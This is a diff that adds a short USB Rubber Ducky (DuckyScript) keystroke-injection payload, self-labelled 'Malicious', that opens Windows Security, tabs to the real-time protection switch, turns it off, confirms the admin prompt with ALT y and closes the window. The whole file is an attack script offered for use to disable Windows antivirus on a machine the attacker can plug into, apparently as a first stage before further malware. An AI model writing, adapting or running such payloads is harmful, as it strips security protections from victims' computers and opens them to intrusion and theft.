@@ -1,0 +1,29 @@
+REM Tittle: Disable real time protection  2.0
+REM OS: Windows 10.0.19042
+REM Category: Malicious
+REM Tested: No 
+REM Author: Florian H. 
+DELAY 250
+GUI 
+DELAY 250
+STRING Windows Security
+ENTER
+DELAY 250
+ENTER
+DELAY 250
+TAB 
+DELAY 250
+TAB
+DELAY 250
+TAB
+DELAY 250
+TAB
+DELAY 250
+ENTER
+DELAY 250
+SPACE
+DELAY 250
+ALT y
+DELAY 250
+ENTER
+ALT F4
